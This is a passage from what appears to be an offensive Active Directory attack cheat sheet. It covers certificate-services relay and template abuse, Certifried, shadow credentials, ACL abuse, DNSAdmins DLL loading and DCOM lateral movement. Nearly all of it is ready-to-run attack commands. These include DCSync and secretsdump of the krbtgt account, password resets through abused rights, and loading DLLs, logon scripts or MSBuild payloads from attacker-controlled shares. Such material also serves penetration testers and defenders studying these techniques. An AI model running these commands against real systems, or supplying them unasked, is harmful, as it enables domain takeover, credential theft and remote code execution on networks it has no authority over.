/ptt # Now you can use the TGT to perform a DCSync mimikatz\u0026gt; lsadump::dcsync /user:krbtgt Version 2: NTLM Relay + Mimikatz + Kekeo\nimpacket\u0026gt; python3 ./examples/ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController # Mimikatz mimikatz\u0026gt; misc::efs /server:dc.lab.local /connect:\u0026lt;IP\u0026gt; /noauth # Kekeo kekeo\u0026gt; base64 /input:on kekeo\u0026gt; tgt::ask /pfx:\u0026lt;BASE64-CERT-FROM-NTLMRELAY\u0026gt; /user:dc$ /domain:lab.local /ptt # Mimikatz mimikatz\u0026gt; lsadump::dcsync /user:krbtgt Version 3: Kerberos Relay\n# Setup the relay sudo krbrelayx.py --target http://CA/certsrv -ip attacker_IP --victim target.domain.local --adcs --template Machine # Run mitm6 sudo mitm6 --domain domain.local --host-allowlist target.domain.local --relay CA.domain.local -v Version 4: ADCSPwn - Require WebClient service running on the domain controller. By default this service is not installed.\nhttps://github.com/bats3c/ADCSPwn adcspwn.exe --adcs \u0026lt;cs server\u0026gt; --port [local port] --remote [computer] adcspwn.exe --adcs cs.pwnlab.local adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --port 9001 adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --output C:\\Temp\\cert_b64.txt adcspwn.exe --adcs cs.pwnlab.local --remote dc.pwnlab.local --username pwnlab.local\\mranderson --password The0nly0ne! --dc dc.pwnlab.local # ADCSPwn arguments adcs - This is the address of the AD CS server which authentication will be relayed to. secure - Use HTTPS with the certificate service. port - The port ADCSPwn will listen on. remote - Remote machine to trigger authentication from. username - Username for non-domain context. password - Password for non-domain context. dc - Domain controller to query for Certificate Templates (LDAP). unc - Set custom UNC callback path for EfsRpcOpenFileRaw (Petitpotam) . output - Output path to store base64 generated crt. Version 5: Certipy ESC8\ncertipy relay -ca 172.16.19.100 ESC9 - No Security Extension # Requirements:\nStrongCertificateBindingEnforcement set to 1 (default) or 0 Certificate contains the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value Certificate specifies Any Client authentication EKU GenericWrite over any account A to compromise any account B Scenario\nJohn@corp.local has GenericWrite over Jane@corp.local, and we want to compromise Administrator@corp.local. Jane@corp.local is allowed to enroll in the certificate template ESC9 that specifies the CT_FLAG_NO_SECURITY_EXTENSION flag in the msPKI-Enrollment-Flag value.\nObtain the hash of Jane with Shadow Credentials (using our GenericWrite) certipy shadow auto -username John@corp.local -p Passw0rd -account Jane Change the userPrincipalName of Jane to be Administrator. :warning: leave the @corp.local part certipy account update -username John@corp.local -password Passw0rd -user Jane -upn Administrator Request the vulnerable certificate template ESC9 from Jane\u0026rsquo;s account. certipy req -username jane@corp.local -hashes ... -ca corp-DC-CA -template ESC9 # userPrincipalName in the certificate is Administrator # the issued certificate contains no \u0026#34;object SID\u0026#34; Restore userPrincipalName of Jane to Jane@corp.local. certipy account update -username John@corp.local -password Passw0rd -user Jane@corp.local Authenticate with the certificate and receive the NT hash of the Administrator@corp.local user. certipy auth -pfx administrator.pfx -domain corp.local # Add -domain \u0026lt;domain\u0026gt; to your command line since there is no domain specified in the certificate. Certifried CVE-2022-26923 # An authenticated user could manipulate attributes on computer accounts they own or manage, and acquire a certificate from Active Directory Certificate Services that would allow elevation of privilege.\nFind ms-DS-MachineAccountQuota python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 getObjectAttributes \u0026#39;DC=lab,DC=local\u0026#39; ms-DS-MachineAccountQuota Add a new computer in the Active Directory, by default MachineAccountQuota = 10 python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 addComputer cve \u0026#39;CVEPassword1234*\u0026#39; certipy account create \u0026#39;lab.local/username:Password123*@dc.lab.local\u0026#39; -user \u0026#39;cve\u0026#39; -dns \u0026#39;dc.lab.local\u0026#39; [ALTERNATIVE] If you are SYSTEM and the MachineAccountQuota=0: Use a ticket for the current machine and reset its SPN Rubeus.exe tgtdeleg export KRB5CCNAME=/tmp/ws02.ccache python bloodyAD -d lab.local -u \u0026#39;ws02$\u0026#39; -k --host dc.lab.local setAttribute \u0026#39;CN=ws02,CN=Computers,DC=lab,DC=local\u0026#39; servicePrincipalName \u0026#39;[]\u0026#39; Set the dNSHostName attribute to match the Domain Controller hostname python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 setAttribute \u0026#39;CN=cve,CN=Computers,DC=lab,DC=local\u0026#39; dNSHostName \u0026#39;[\u0026#34;DC.lab.local\u0026#34;]\u0026#39; python bloodyAD.py -d lab.local -u username -p \u0026#39;Password123*\u0026#39; --host 10.10.10.10 getObjectAttributes \u0026#39;CN=cve,CN=Computers,DC=lab,DC=local\u0026#39; dNSHostName Request a ticket # certipy req \u0026#39;domain.local/cve$:CVEPassword1234*@ADCS_IP\u0026#39; -template Machine -dc-ip DC_IP -ca discovered-CA certipy req \u0026#39;lab.local/cve$:CVEPassword1234*@10.100.10.13\u0026#39; -template Machine -dc-ip 10.10.10.10 -ca lab-ADCS-CA Either use the pfx or set a RBCD on your machine account to takeover the domain certipy auth -pfx ./dc.pfx -dc-ip 10.10.10.10 openssl pkcs12 -in dc.pfx -out dc.pem -nodes python bloodyAD.py -d lab.local -c \u0026#34;:dc.pem\u0026#34; -u \u0026#39;cve$\u0026#39; --host 10.10.10.10 setRbcd \u0026#39;CVE$\u0026#39; \u0026#39;CRASHDC$\u0026#39; getST.py -spn LDAP/CRASHDC.lab.local -impersonate Administrator -dc-ip 10.10.10.10 \u0026#39;lab.local/cve$:CVEPassword1234*\u0026#39; secretsdump.py -user-status -just-dc-ntlm -just-dc-user krbtgt \u0026#39;lab.local/Administrator@dc.lab.local\u0026#39; -k -no-pass -dc-ip 10.10.10.10 -target-ip 10.10.10.10 Pass-The-Certificate # Pass the Certificate in order to get a TGT, this technique is used in \u0026ldquo;UnPAC the Hash\u0026rdquo; and \u0026ldquo;Shadow Credential\u0026rdquo;\nWindows # Information about a cert file certutil -v -dump admin.pfx # From a Base64 PFX Rubeus.exe asktgt /user:\u0026#34;TARGET_SAMNAME\u0026#34; /certificate:cert.pfx /password:\u0026#34;CERTIFICATE_PASSWORD\u0026#34; /domain:\u0026#34;FQDN_DOMAIN\u0026#34; /dc:\u0026#34;DOMAIN_CONTROLLER\u0026#34; /show # Grant DCSync rights to an user ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \u0026#34;DC=domain,DC=local\u0026#34; --sid \u0026lt;user_SID\u0026gt; # To restore ./PassTheCert.exe --server dc.domain.local --cert-path C:\\cert.pfx --elevate --target \u0026#34;DC=domain,DC=local\u0026#34; --restore restoration_file.txt Linux # Base64-encoded PFX certificate (string) (password can be set) gettgtpkinit.py -pfx-base64 $(cat \u0026#34;PATH_TO_B64_PFX_CERT\u0026#34;) \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; ​ # PEM certificate (file) + PEM private key (file) gettgtpkinit.py -cert-pem \u0026#34;PATH_TO_PEM_CERT\u0026#34; -key-pem \u0026#34;PATH_TO_PEM_KEY\u0026#34; \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; # PFX certificate (file) + password (string, optionnal) gettgtpkinit.py -cert-pfx \u0026#34;PATH_TO_PFX_CERT\u0026#34; -pfx-pass \u0026#34;CERT_PASSWORD\u0026#34; \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; # Using Certipy certipy auth -pfx \u0026#34;PATH_TO_PFX_CERT\u0026#34; -dc-ip \u0026#39;dc-ip\u0026#39; -username \u0026#39;user\u0026#39; -domain \u0026#39;domain\u0026#39; certipy cert -export -pfx \u0026#34;PATH_TO_PFX_CERT\u0026#34; -password \u0026#34;CERT_PASSWORD\u0026#34; -out \u0026#34;unprotected.pfx\u0026#34; UnPAC The Hash # Using the UnPAC The Hash method, you can retrieve the NT Hash for an User via its certificate.\nWindows # Request a ticket using a certificate and use /getcredentials to retrieve the NT hash in the PAC. Rubeus.exe asktgt /getcredentials /user:\u0026#34;TARGET_SAMNAME\u0026#34; /certificate:\u0026#34;BASE64_CERTIFICATE\u0026#34; /password:\u0026#34;CERTIFICATE_PASSWORD\u0026#34; /domain:\u0026#34;FQDN_DOMAIN\u0026#34; /dc:\u0026#34;DOMAIN_CONTROLLER\u0026#34; /show Linux # Obtain a TGT by validating a PKINIT pre-authentication $ gettgtpkinit.py -cert-pfx \u0026#34;PATH_TO_CERTIFICATE\u0026#34; -pfx-pass \u0026#34;CERTIFICATE_PASSWORD\u0026#34; \u0026#34;FQDN_DOMAIN/TARGET_SAMNAME\u0026#34; \u0026#34;TGT_CCACHE_FILE\u0026#34; # Use the session key to recover the NT hash $ export KRB5CCNAME=\u0026#34;TGT_CCACHE_FILE\u0026#34; getnthash.py -key \u0026#39;AS-REP encryption key\u0026#39; \u0026#39;FQDN_DOMAIN\u0026#39;/\u0026#39;TARGET_SAMNAME\u0026#39; Shadow Credentials # Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform Kerberos authentication as that account using PKINIT to obtain a TGT for that user. When trying to pre-authenticate with PKINIT, the KDC will check that the authenticating user has knowledge of the matching private key, and a TGT will be sent if there is a match.\n:warning: User objects can\u0026rsquo;t edit their own msDS-KeyCredentialLink attribute while computer objects can. Computer objects can edit their own msDS-KeyCredentialLink attribute but can only add a KeyCredential if none already exists\nRequirements:\nDomain Controller on (at least) Windows Server 2016 Domain must have Active Directory Certificate Services and Certificate Authority configured PKINIT Kerberos authentication An account with the delegated rights to write to the msDS-KeyCredentialLink attribute of the target object Exploitation:\nFrom Windows, use Whisker:\n# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. Whisker.exe list /target:computername$ # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. Whisker.exe add /target:\u0026#34;TARGET_SAMNAME\u0026#34; /domain:\u0026#34;FQDN_DOMAIN\u0026#34; /dc:\u0026#34;DOMAIN_CONTROLLER\u0026#34; /path:\u0026#34;cert.pfx\u0026#34; /password:\u0026#34;pfx-password\u0026#34; Whisker.exe add /target:computername$ [/domain:constoso.local /dc:dc1.contoso.local /path:C:\\path\\to\\file.pfx /password:P@ssword1] # Removes a key credential from the target object specified by a DeviceID GUID. Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.local /remove:2de4643a-2e0b-438f-a99d-5cb058b3254b From Linux, use pyWhisker:\n# Lists all the entries of the msDS-KeyCredentialLink attribute of the target object. python3 pywhisker.py -d \u0026#34;domain.local\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;complexpassword\u0026#34; --target \u0026#34;user2\u0026#34; --action \u0026#34;list\u0026#34; # Generates a public-private key pair and adds a new key credential to the target object as if the user enrolled to WHfB from a new device. pywhisker.py -d \u0026#34;FQDN_DOMAIN\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;CERTIFICATE_PASSWORD\u0026#34; --target \u0026#34;TARGET_SAMNAME\u0026#34; --action \u0026#34;list\u0026#34; python3 pywhisker.py -d \u0026#34;domain.local\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;complexpassword\u0026#34; --target \u0026#34;user2\u0026#34; --action \u0026#34;add\u0026#34; --filename \u0026#34;test1\u0026#34; # Removes a key credential from the target object specified by a DeviceID GUID. python3 pywhisker.py -d \u0026#34;domain.local\u0026#34; -u \u0026#34;user1\u0026#34; -p \u0026#34;complexpassword\u0026#34; --target \u0026#34;user2\u0026#34; --action \u0026#34;remove\u0026#34; --device-id \u0026#34;a8ce856e-9b58-61f9-8fd3-b079689eb46e\u0026#34; Scenario:\nScenario 1: Shadow Credential relaying\nTrigger an NTLM authentication from DC01 (PetitPotam) Relay it to DC02 (ntlmrelayx) Edit DC01\u0026rsquo;s attribute to create a Kerberos PKINIT pre-authentication backdoor (pywhisker) Alternatively : ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$' Scenario 2: Workstation Takeover with RBCD\n# Only for C2: Add Reverse Port Forward from 8081 to Team Server 81 # Set up ntlmrelayx to relay authentication from target workstation to DC proxychains python3 ntlmrelayx.py -t ldaps://dc1.ez.lab --shadow-credentials --shadow-target ws2\\$ --http-port 81 # Execute printer bug to trigger authentication from target workstation proxychains python3 printerbug.py ez.lab/matt:Password1\\!@ws2.ez.lab ws1@8081/file # Get a TGT using the newly acquired certificate via PKINIT proxychains python3 gettgtpkinit.py ez.lab/ws2\\$ ws2.ccache -cert-pfx /opt/impacket/examples/T12uyM5x.pfx -pfx-pass 5j6fNfnsU7BkTWQOJhpR # Get a ST (service ticket) for the target account proxychains python3 gets4uticket.py kerberos+ccache://ez.lab\\\\ws2\\$:ws2.ccache@dc1.ez.lab cifs/ws2.ez.lab@ez.lab administrator@ez.lab administrator_tgs.ccache -v # Utilize the ST for future activity export KRB5CCNAME=/opt/pkinittools/administrator_ws2.ccache proxychains python3 wmiexec.py -k -no-pass ez.lab/administrator@ws2.ez.lab Dangerous Built-in Groups Usage # If you do not want modified ACLs to be overwritten every hour, you should change ACL template on the object CN=AdminSDHolder,CN=System or set \u0026quot;dminCount attribute to 0 for the required object.\nThe AdminCount attribute is set to 1 automatically when a user is assigned to any privileged group, but it is never automatically unset when the user is removed from these group(s).\nFind users with AdminCount=1.\ncrackmapexec ldap 10.10.10.10 -u username -p password --admin-count # or python ldapdomaindump.py -u example.com\\john -p pass123 -d \u0026#39;;\u0026#39; 10.10.10.10 jq -r \u0026#39;.[].attributes | select(.adminCount == [1]) | .sAMAccountName[]\u0026#39; domain_users.json # or Get-ADUser -LDAPFilter \u0026#34;(objectcategory=person)(samaccountname=*)(admincount=1)\u0026#34; Get-ADGroup -LDAPFilter \u0026#34;(objectcategory=group) (admincount=1)\u0026#34; # or ([adsisearcher]\u0026#34;(AdminCount=1)\u0026#34;).findall() AdminSDHolder Abuse # The Access Control List (ACL) of the AdminSDHolder object is used as a template to copy permissions to all \u0026ldquo;protected groups\u0026rdquo; in Active Directory and their members. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins.\nIf you modify the permissions of AdminSDHolder, that permission template will be pushed out to all protected accounts automatically by SDProp (in an hour). E.g: if someone tries to delete this user from the Domain Admins in an hour or less, the user will be back in the group.\n# Add a user to the AdminSDHolder group: Add-DomainObjectAcl -TargetIdentity \u0026#39;CN=AdminSDHolder,CN=System,DC=domain,DC=local\u0026#39; -PrincipalIdentity username -Rights All -Verbose # Right to reset password for toto using the account titi Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword # Give all rights Add-ObjectAcl -TargetADSprefix \u0026#39;CN=AdminSDHolder,CN=System\u0026#39; -PrincipalSamAccountName toto -Verbose -Rights All Abusing DNS Admins Group # It is possible for the members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM).\n:warning: Require privileges to restart the DNS service.\nEnumerate members of DNSAdmins group Get-NetGroupMember -GroupName \u0026#34;DNSAdmins\u0026#34; Get-ADGroupMember -Identity DNSAdmins Change dll loaded by the DNS service # with RSAT dnscmd \u0026lt;servername\u0026gt; /config /serverlevelplugindll \\\\attacker_IP\\dll\\mimilib.dll dnscmd 10.10.10.11 /config /serverlevelplugindll \\\\10.10.10.10\\exploit\\privesc.dll # with DNSServer module $dnsettings = Get-DnsServerSetting -ComputerName \u0026lt;servername\u0026gt; -Verbose -All $dnsettings.ServerLevelPluginDll = \u0026#34;\\attacker_IP\\dll\\mimilib.dll\u0026#34; Set-DnsServerSetting -InputObject $dnsettings -ComputerName \u0026lt;servername\u0026gt; -Verbose Check the previous command success Get-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Services\\DNS\\Parameters\\ -Name ServerLevelPluginDll Restart DNS sc \\\\dc01 stop dns sc \\\\dc01 start dns Abusing Active Directory ACLs/ACEs # Check ACL for an User with ADACLScanner.\nADACLScan.ps1 -Base \u0026#34;DC=contoso;DC=com\u0026#34; -Filter \u0026#34;(\u0026amp;(AdminCount=1))\u0026#34; -Scope subtree -EffectiveRightsPrincipal User1 -Output HTML -Show GenericAll # GenericAll on User : We can reset user\u0026rsquo;s password without knowing the current password\nGenericAll on Group : Effectively, this allows us to add ourselves (the user hacker) to the Domain Admin group :\nOn Windows : net group \u0026quot;domain admins\u0026quot; hacker /add /domain On Linux: using the Samba software suite : net rpc group ADDMEM \u0026quot;GROUP NAME\u0026quot; UserToAdd -U 'hacker%MyPassword123' -W DOMAIN -I [DC IP] using bloodyAD: bloodyAD.py --host [DC IP] -d DOMAIN -u hacker -p MyPassword123 addObjectToGroup UserToAdd 'GROUP NAME' GenericAll/GenericWrite : We can set a SPN on a target account, request a Service Ticket (ST), then grab its hash and kerberoast it.\n# Check for interesting permissions on accounts: Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match \u0026#34;RDPUsers\u0026#34;} # Check if current user has already an SPN setted: PowerView2 \u0026gt; Get-DomainUser -Identity \u0026lt;UserName\u0026gt; | select serviceprincipalname # Force set the SPN on the account: Targeted Kerberoasting PowerView2 \u0026gt; Set-DomainObject \u0026lt;UserName\u0026gt; -Set @{serviceprincipalname=\u0026#39;ops/whatever1\u0026#39;} PowerView3 \u0026gt; Set-DomainObject -Identity \u0026lt;UserName\u0026gt; -Set @{serviceprincipalname=\u0026#39;any/thing\u0026#39;} # Grab the ticket PowerView2 \u0026gt; $User = Get-DomainUser username PowerView2 \u0026gt; $User | Get-DomainSPNTicket | fl PowerView2 \u0026gt; $User | Select serviceprincipalname # Remove the SPN PowerView2 \u0026gt; Set-DomainObject -Identity username -Clear serviceprincipalname GenericAll/GenericWrite : We can change a victim\u0026rsquo;s userAccountControl to not require Kerberos preauthentication, grab the user\u0026rsquo;s crackable AS-REP, and then change the setting back.\nOn Windows: # Modify the userAccountControl PowerView2 \u0026gt; Get-DomainUser username | ConvertFrom-UACValue PowerView2 \u0026gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose # Grab the ticket PowerView2 \u0026gt; Get-DomainUser username | ConvertFrom-UACValue ASREPRoast \u0026gt; Get-ASREPHash -Domain domain.local -UserName username # Set back the userAccountControl PowerView2 \u0026gt; Set-DomainObject -Identity username -XOR @{useraccountcontrol=4194304} -Verbose PowerView2 \u0026gt; Get-DomainUser username | ConvertFrom-UACValue On Linux: # Modify the userAccountControl $ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user # Grab the ticket $ GetNPUsers.py DOMAIN/target_user -format \u0026lt;AS_REP_responses_format [hashcat | john]\u0026gt; -outputfile \u0026lt;output_AS_REP_responses_file\u0026gt; # Set back the userAccountControl $ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false GenericWrite # Reset another user\u0026rsquo;s password\nOn Windows: # https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1 $user = \u0026#39;DOMAIN\\user1\u0026#39;; $pass= ConvertTo-SecureString \u0026#39;user1pwd\u0026#39; -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential $user, $pass; $newpass = ConvertTo-SecureString \u0026#39;newsecretpass\u0026#39; -AsPlainText -Force; Set-DomainUserPassword -Identity \u0026#39;DOMAIN\\user2\u0026#39; -AccountPassword $newpass -Credential $creds; On Linux: # Using rpcclient from the Samba software suite rpcclient -U \u0026#39;attacker_user%my_password\u0026#39; -W DOMAIN -c \u0026#34;setuserinfo2 target_user 23 target_newpwd\u0026#34; # Using bloodyAD with pass-the-hash bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd WriteProperty on an ObjectType, which in this particular case is Script-Path, allows the attacker to overwrite the logon script path of the delegate user, which means that the next time, when the user delegate logs on, their system will execute our malicious script : Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue \u0026quot;\\\\10.0.0.5\\totallyLegitScript.ps1\nGenericWrite and Remote Connection Manager # Now let’s say you are in an Active Directory environment that still actively uses a Windows Server version that has RCM enabled, or that you are able to enable RCM on a compromised RDSH, what can we actually do ? Well each user object in Active Directory has a tab called ‘Environment’.\nThis tab includes settings that, among other things, can be used to change what program is started when a user connects over the Remote Desktop Protocol (RDP) to a TS/RDSH in place of the normal graphical environment. The settings in the ‘Starting program’ field basically function like a windows shortcut, allowing you to supply either a local or remote (UNC) path to an executable which is to be started upon connecting to the remote host. During the logon process these values will be queried by the RCM process and run whatever executable is defined. - https://sensepost.com/blog/2020/ace-to-rce/\n:warning: The RCM is only active on Terminal Servers/Remote Desktop Session Hosts. The RCM has also been disabled on recent version of Windows (\u0026gt;2016), it requires a registry change to re-enable.\n$UserObject = ([ADSI](\u0026#34;LDAP://CN=User,OU=Users,DC=ad,DC=domain,DC=tld\u0026#34;)) $UserObject.TerminalServicesInitialProgram = \u0026#34;\\\\1.2.3.4\\share\\file.exe\u0026#34; $UserObject.TerminalServicesWorkDirectory = \u0026#34;C:\\\u0026#34; $UserObject.SetInfo() NOTE: To not alert the user the payload should hide its own process window and spawn the normal graphical environment.\nWriteDACL # To abuse WriteDacl to a domain object, you may grant yourself the DcSync privileges. It is possible to add any given account as a replication partner of the domain by applying the following extended rights Replicating Directory Changes/Replicating Directory Changes All. Invoke-ACLPwn is a tool that automates the discovery and pwnage of ACLs in Active Directory that are unsafe configured : ./Invoke-ACL.ps1 -SharpHoundLocation .\\sharphound.exe -mimiKatzLocation .\\mimikatz.exe -Username 'user1' -Domain 'domain.local' -Password 'Welcome01!'\nWriteDACL on Domain:\nOn Windows: # Give DCSync right to the principal identity Import-Module .\\PowerView.ps1 $SecPassword = ConvertTo-SecureString \u0026#39;user1pwd\u0026#39; -AsPlainText -Force $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;DOMAIN.LOCAL\\user1\u0026#39;, $SecPassword) Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#39;DC=domain,DC=local\u0026#39; -Rights DCSync -PrincipalIdentity user2 -Verbose -Domain domain.local * On Linux:\nGive DCSync right to the principal identity oodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 Remove right after DCSync oodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B setDCSync user2 False WriteDACL on Group\nAdd-DomainObjectAcl -TargetIdentity \u0026#34;INTERESTING_GROUP\u0026#34; -Rights WriteMembers -PrincipalIdentity User1 net group \u0026#34;INTERESTING_GROUP\u0026#34; User1 /add /domain Or\nbloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp # Remove right bloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setGenericAll devil_user1 cn=INTERESTING_GROUP,dc=corp False WriteOwner # An attacker can update the owner of the target object. Once the object owner has been changed to a principal the attacker controls, the attacker may manipulate the object any way they see fit. This can be achieved with Set-DomainObjectOwner (PowerView module).\nSet-DomainObjectOwner -Identity \u0026#39;target_object\u0026#39; -OwnerIdentity \u0026#39;controlled_principal\u0026#39; Or\nbloodyAD.py --host my.dc.corp -d corp -u devil_user1 -p P@ssword123 setOwner devil_user1 target_object This ACE can be abused for an Immediate Scheduled Task attack, or for adding a user to the local admin group.\nReadLAPSPassword # An attacker can read the LAPS password of the computer account this ACE applies to. This can be achieved with the Active Directory PowerShell module. Detail of the exploitation can be found in the Reading LAPS Password section.\nGet-ADComputer -filter {ms-mcs-admpwdexpirationtime -like \u0026#39;*\u0026#39;} -prop \u0026#39;ms-mcs-admpwd\u0026#39;,\u0026#39;ms-mcs-admpwdexpirationtime\u0026#39; Or for a given computer\nbloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes LAPS_PC$ ms-mcs-admpwd,ms-mcs-admpwdexpirationtime ReadGMSAPassword # An attacker can read the GMSA password of the account this ACE applies to. This can be achieved with the Active Directory and DSInternals PowerShell modules.\n# Save the blob to a variable $gmsa = Get-ADServiceAccount -Identity \u0026#39;SQL_HQ_Primary\u0026#39; -Properties \u0026#39;msDS-ManagedPassword\u0026#39; $mp = $gmsa.\u0026#39;msDS-ManagedPassword\u0026#39; # Decode the data structure using the DSInternals module ConvertFrom-ADManagedPasswordBlob $mp Or\npython bloodyAD.py -u john.doe -d bloody -p Password512 --host 192.168.10.2 getObjectAttributes gmsaAccount$ msDS-ManagedPassword ForceChangePassword # An attacker can change the password of the user this ACE applies to:\nOn Windows, this can be achieved with Set-DomainUserPassword (PowerView module): $NewPassword = ConvertTo-SecureString \u0026#39;Password123!\u0026#39; -AsPlainText -Force Set-DomainUserPassword -Identity \u0026#39;TargetUser\u0026#39; -AccountPassword $NewPassword On Linux: # Using rpcclient from the Samba software suite rpcclient -U \u0026#39;attacker_user%my_password\u0026#39; -W DOMAIN -c \u0026#34;setuserinfo2 target_user 23 target_newpwd\u0026#34; # Using bloodyAD with pass-the-hash bloodyAD.py --host [DC IP] -d DOMAIN -u attacker_user -p :B4B9B02E6F09A9BD760F388B67351E2B changePassword target_user target_newpwd DCOM Exploitation # DCOM is an extension of COM (Component Object Model), which allows applications to instantiate and access the properties and methods of COM objects on a remote computer.\nImpacket DCOMExec.py dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC] [-object [{ShellWindows,ShellBrowserWindow,MMC20}]] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB] target [command ...] dcomexec.py -share C$ -object MMC20 \u0026#39;\u0026lt;DOMAIN\u0026gt;/\u0026lt;USERNAME\u0026gt;:\u0026lt;PASSWORD\u0026gt;@\u0026lt;MACHINE_CIBLE\u0026gt;\u0026#39; dcomexec.py -share C$ -object MMC20 \u0026#39;\u0026lt;DOMAIN\u0026gt;/\u0026lt;USERNAME\u0026gt;:\u0026lt;PASSWORD\u0026gt;@\u0026lt;MACHINE_CIBLE\u0026gt;\u0026#39; \u0026#39;ipconfig\u0026#39; python3 dcomexec.py -object MMC20 -silentcommand -debug $DOMAIN/$USER:$PASSWORD\\$@$HOST \u0026#39;notepad.exe\u0026#39; # -object MMC20 specifies that we wish to instantiate the MMC20.Application object. # -silentcommand executes the command without attempting to retrieve the output. CheeseTools - https://github.com/klezVirus/CheeseTools # https://klezvirus.github.io/RedTeaming/LateralMovement/LateralMovementDCOM/ -t, --target=VALUE Target Machine -b, --binary=VALUE Binary: powershell.exe -a, --args=VALUE Arguments: -enc \u0026lt;blah\u0026gt; -m, --method=VALUE Methods: MMC20Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro -r, --reg, --registry Enable registry manipulation -h, -?, --help Show Help Current Methods: MMC20.Application, ShellWindows, ShellBrowserWindow, ExcelDDE, VisioAddonEx, OutlookShellEx, ExcelXLL, VisioExecLine, OfficeMacro. Invoke-DCOM - https://raw.githubusercontent.com/rvrsh3ll/Misc-Powershell-Scripts/master/Invoke-DCOM.ps1 Import-Module .\\Invoke-DCOM.ps1 Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method MMC20.Application -Command \u0026#34;calc.exe\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ExcelDDE -Command \u0026#34;calc.exe\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ServiceStart \u0026#34;MyService\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ShellBrowserWindow -Command \u0026#34;calc.exe\u0026#34; Invoke-DCOM -ComputerName \u0026#39;10.10.10.10\u0026#39; -Method ShellWindows -Command \u0026#34;calc.exe\u0026#34; DCOM via MMC Application Class # This COM object (MMC20.Application) allows you to script components of MMC snap-in operations. there is a method named \u0026ldquo;ExecuteShellCommand\u0026rdquo; under Document.ActiveView.\nPS C:\\\u0026gt; $com = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;MMC20.Application\u0026#34;,\u0026#34;10.10.10.1\u0026#34;)) PS C:\\\u0026gt; $com.Document.ActiveView.ExecuteShellCommand(\u0026#34;C:\\Windows\\System32\\calc.exe\u0026#34;,$null,$null,7) PS C:\\\u0026gt; $com.Document.ActiveView.ExecuteShellCommand(\u0026#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#34;,$null,\u0026#34;-enc DFDFSFSFSFSFSFSFSDFSFSF \u0026lt; Empire encoded string \u0026gt; \u0026#34;,\u0026#34;7\u0026#34;) # Weaponized example with MSBuild PS C:\\\u0026gt; [System.Activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;MMC20.Application\u0026#34;,\u0026#34;10.10.10.1\u0026#34;)).Document.ActiveView.ExecuteShellCommand(\u0026#34;c:\\windows\\Microsoft.NET\\Framework\\v4.0.30319\\MSBuild.exe\u0026#34;,$null,\u0026#34;\\\\10.10.10.2\\webdav\\build.xml\u0026#34;,\u0026#34;7\u0026#34;) Invoke-MMC20RCE : https://raw.githubusercontent.com/n0tty/powershellery/master/Invoke-MMC20RCE.ps1\nDCOM via Office # Excel.Application DDEInitiate RegisterXLL Outlook.Application 